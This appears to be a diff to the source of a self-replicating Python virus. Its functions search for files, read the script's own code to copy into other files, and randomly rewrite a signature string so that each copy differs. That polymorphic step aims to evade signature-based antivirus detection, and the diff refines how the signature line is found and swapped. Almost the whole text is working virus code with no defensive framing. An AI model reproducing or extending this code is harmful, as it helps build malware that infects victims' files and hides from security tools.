@@ -14,11 +14,11 @@ def morph():
     num = random.randint(0,1)
     if not num:
         newsig += str(random.randint(-1000,1000))
-        newsig += " PYTHON VIRUS"
+        newsig += ' PYTHON VIRUS"'
     else:
         newsig += "PYTHON "
         newsig += str(random.randint(-1000,1000))
-        newsig += " VIRUS"
+        newsig += ' VIRUS"'
     return newsig
 
 def search(path):
@@ -39,10 +39,12 @@ def search(path):
 def infect(filestoinfect):
     virus = open(os.path.abspath(__file__))
     virusstring = ""
+    changesig = False
     for i,line in enumerate(virus):
         if i>=0 and i <63:
-            if "CRANKLIN" in line and "PYTHON" in line and "VIRUS" in line:
+            if "SIGNATURE =" in line and not changesig:
                 virusstring += morph()
+                changesig = True
             else:
                 virusstring += line
     virus.close
